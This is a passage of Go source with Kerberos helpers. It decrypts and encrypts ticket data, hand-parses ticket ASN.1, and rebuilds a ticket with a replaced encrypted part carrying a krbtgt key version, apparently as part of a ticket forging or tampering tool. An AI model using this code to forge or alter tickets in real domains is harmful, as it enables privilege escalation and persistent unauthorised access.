		return crypto.DecryptRC4(key, ciphertext, usage)
	default:
		return nil, fmt.Errorf("unsupported encryption type: %d", etype)
	}
}

// encryptWithEtype encrypts data using the appropriate etype
func encryptWithEtype(plaintext, key []byte, usage int, etype int32) ([]byte, error) {
	switch etype {
	case crypto.EtypeAES256, crypto.EtypeAES128:
		return crypto.EncryptAES(key, plaintext, usage, int(etype))
	case crypto.EtypeRC4:
		return crypto.EncryptRC4(key, plaintext, usage)
	default:
		return nil, fmt.Errorf("unsupported encryption type: %d", etype)
	}
}

// extractTicketEncPart extracts etype and cipher from raw ticket bytes.
// Ticket ::= APPLICATION 1 -> SEQUENCE { [0] tkt-vno, [1] realm, [2] sname, [3] enc-part }
func extractTicketEncPart(data []byte) (etype int32, cipher []byte, err error) {
	if len(data) < 20 || data[0] != 0x61 { // APPLICATION 1
		return 0, nil, fmt.Errorf("not a valid ticket")
	}

	// Skip APPLICATION 1 header
	pos := 2
	if data[1] == 0x82 {
		pos = 4
	} else if data[1] == 0x81 {
		pos = 3
	}

	// Skip SEQUENCE header
	if data[pos] == 0x30 {
		if data[pos+1] == 0x82 {
			pos += 4
		} else if data[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	// Parse fields to find [3] enc-part
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			contentPos = pos + 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			contentPos = pos + 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		if tag == 3 { // enc-part (EncryptedData)
			encData := data[contentPos : contentPos+fieldLen]
			return parseEncryptedData(encData)
		}

		pos = contentPos + fieldLen
	}

	return 0, nil, fmt.Errorf("enc-part not found in ticket")
}

// parseEncryptedData extracts etype and cipher from EncryptedData bytes.
func parseEncryptedData(data []byte) (etype int32, cipher []byte, err error) {
	if len(data) < 10 || data[0] != 0x30 {
		return 0, nil, fmt.Errorf("invalid EncryptedData")
	}

	pos := 2
	if data[1] == 0x82 {
		pos = 4
	} else if data[1] == 0x81 {
		pos = 3
	}

	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			contentPos = pos + 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			contentPos = pos + 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		fieldData := data[contentPos : contentPos+fieldLen]

		if tag == 0 { // etype
			if fieldData[0] == 0x02 {
				eLen := int(fieldData[1])
				val := int32(0)
				for i := 0; i < eLen; i++ {
					val = (val << 8) | int32(fieldData[2+i])
				}
				etype = val
			}
		} else if tag == 2 { // cipher
			if fieldData[0] == 0x04 {
				octetLen := int(fieldData[1])
				octetStart := 2
				if fieldData[1] == 0x82 {
					octetLen = (int(fieldData[2]) << 8) | int(fieldData[3])
					octetStart = 4
				} else if fieldData[1] == 0x81 {
					octetLen = int(fieldData[2])
					octetStart = 3
				}
				cipher = fieldData[octetStart : octetStart+octetLen]
			}
		}

		pos = contentPos + fieldLen
	}

	if len(cipher) == 0 {
		return 0, nil, fmt.Errorf("cipher not found")
	}

	return etype, cipher, nil
}

// replaceTicketCipher replaces the cipher in ticket raw bytes with new encrypted data.
// This reconstructs the ticket with the new EncryptedData.
func replaceTicketCipher(ticketBytes []byte, newCipher []byte, etype int32) ([]byte, error) {
	if len(ticketBytes) < 20 || ticketBytes[0] != 0x61 { // APPLICATION 1
		return nil, fmt.Errorf("invalid ticket")
	}

	// Skip APPLICATION 1 header
	pos := 2
	if ticketBytes[1] == 0x82 {
		pos = 4
	} else if ticketBytes[1] == 0x81 {
		pos = 3
	}

	// Skip SEQUENCE header to get to content
	if ticketBytes[pos] == 0x30 {
		if ticketBytes[pos+1] == 0x82 {
			pos += 4
		} else if ticketBytes[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	// Save this position - this is where [0] tkt-vno starts
	// We need everything from here up to (but not including) [3] enc-part
	seqContentStart := pos

	// Find [3] enc-part position
	encPartStart := 0
	for pos < len(ticketBytes) {
		if ticketBytes[pos] < 0xa0 {
			break
		}
		tag := int(ticketBytes[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if ticketBytes[pos+1] == 0x82 {
			fieldLen = (int(ticketBytes[pos+2]) << 8) | int(ticketBytes[pos+3])
			contentPos = pos + 4
		} else if ticketBytes[pos+1] == 0x81 {
			fieldLen = int(ticketBytes[pos+2])
			contentPos = pos + 3
		} else if ticketBytes[pos+1] < 0x80 {
			fieldLen = int(ticketBytes[pos+1])
		}

		if tag == 3 {
			encPartStart = pos
			break
		}

		pos = contentPos + fieldLen
	}

	if encPartStart == 0 {
		return nil, fmt.Errorf("enc-part not found")
	}

	// Build new EncryptedData
	// EncryptedData ::= SEQUENCE { [0] etype, [2] cipher }
	newEncData := buildEncryptedData(etype, newCipher)

	// Build new [3] explicit tag wrapper
	newField3 := []byte{0xa3}
	newField3 = append(newField3, buildLen(len(newEncData))...)
	newField3 = append(newField3, newEncData...)

	// Copy ticket content: [0] tkt-vno, [1] realm, [2] sname (everything before [3] enc-part)
	prefix := ticketBytes[seqContentStart:encPartStart]

	// Build new sequence content
	newSeqContent := append(prefix, newField3...)

	// Build new SEQUENCE
	newSeq := []byte{0x30}
	newSeq = append(newSeq, buildLen(len(newSeqContent))...)
	newSeq = append(newSeq, newSeqContent...)

	// Build new APPLICATION 1
	result := []byte{0x61}
	result = append(result, buildLen(len(newSeq))...)
	result = append(result, newSeq...)

	return result, nil
}

// buildEncryptedData builds EncryptedData ASN.1 structure.
// EncryptedData ::= SEQUENCE { [0] etype INTEGER, [1] kvno INTEGER, [2] cipher OCTET STRING }
func buildEncryptedData(etype int32, cipher []byte) []byte {
	// [0] etype INTEGER
	etypeBytes := []byte{0x02, 0x01, byte(etype)}
	field0 := []byte{0xa0, byte(len(etypeBytes))}
	field0 = append(field0, etypeBytes...)

	// [1] kvno INTEGER (krbtgt key version - typically 2)
	kvnoBytes := []byte{0x02, 0x01, 0x02} // kvno = 2
	field1 := []byte{0xa1, byte(len(kvnoBytes))}
	field1 = append(field1, kvnoBytes...)

	// [2] cipher OCTET STRING
	var field2 []byte
	octetTag := []byte{0x04}
	octetTag = append(octetTag, buildLen(len(cipher))...)
	octetTag = append(octetTag, cipher...)
	field2 = []byte{0xa2}
	field2 = append(field2, buildLen(len(octetTag))...)
	field2 = append(field2, octetTag...)

	// SEQUENCE { [0] etype, [1] kvno, [2] cipher }
	seqContent := append(field0, field1...)
	seqContent = append(seqContent, field2...)
	result := []byte{0x30}
	result = append(result, buildLen(len(seqContent))...)
	result = append(result, seqContent...)

	return result
}

// buildLen builds ASN.1 length bytes.
func buildLen(l int) []byte {
	if l < 128 {
		return []byte{byte(l)}
	} else if l < 256 {
		return []byte{0x81, byte(l)}
	}
	return []byte{0x82, byte(l >> 8), byte(l)}
}

// fixGeneralStringForParsing replaces GeneralString tags (0x1b) with PrintableString (0x13)
// ONLY where they appear as actual ASN.1 string tags, not as data bytes.
// This is critical because 0x1b can appear naturally in binary data like the PAC.
func fixGeneralStringForParsing(data []byte) []byte {
	result := make([]byte, len(data))
	copy(result, data)

	// Walk through the data looking for GeneralString patterns
	// GeneralString (0x1b) followed by a valid length byte followed by ASCII content
	for i := 0; i < len(result)-2; i++ {
		if result[i] == 0x1b {
			// Check if this looks like a valid GeneralString tag
			// The next byte(s) should be a valid ASN.1 length
			// And the content should be valid ASCII (like a realm name)
			lenByte := result[i+1]
			var contentStart int
			var strLen int

			if lenByte < 0x80 {
				// Short form length
				strLen = int(lenByte)
				contentStart = i + 2
			} else if lenByte == 0x81 && i+2 < len(result) {
				// Long form, 1 byte length
				strLen = int(result[i+2])
				contentStart = i + 3
			} else if lenByte == 0x82 && i+3 < len(result) {
				// Long form, 2 byte length
				strLen = (int(result[i+2]) << 8) | int(result[i+3])
				contentStart = i + 4
			} else {
				continue // Invalid length encoding, not a real GeneralString
			}

			// Verify the content looks like a Kerberos string (realm, principal, etc.)
			// Kerberos realms are typically uppercase ASCII with dots
			if contentStart+strLen <= len(result) && strLen > 0 && strLen < 256 {
				looksLikeString := true
				for j := 0; j < min(strLen, 10); j++ { // Check first 10 chars
					c := result[contentStart+j]
					// Kerberos strings should contain printable ASCII
					if c < 0x20 || c > 0x7e {
						looksLikeString = false
						break
					}
				}
				if looksLikeString {
					// This is likely a real GeneralString, convert to PrintableString
					result[i] = 0x13
				}
			}
		}
	}

	return result
}
